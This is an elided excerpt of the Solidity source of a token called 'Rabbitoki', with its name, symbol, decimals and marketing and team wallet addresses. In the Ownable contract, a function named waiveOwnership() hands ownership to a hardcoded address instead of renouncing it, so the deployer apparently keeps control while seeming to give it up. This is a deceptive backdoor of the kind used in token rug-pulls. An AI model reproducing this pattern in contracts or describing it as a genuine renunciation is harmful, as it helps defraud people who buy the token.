...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x96C1b397815Edc75ea7F70642DD056d5B76C09B8);
    }
...
contract Rabbitoki is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Rabbitoki";
    string private _symbol = "RBTK";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xbCC8bbC124d9c5ca373EF7C7b5596aCc94873b53);
    address payable public teamWalletAddress = payable(0xbCC8bbC124d9c5ca373EF7C7b5596aCc94873b53);
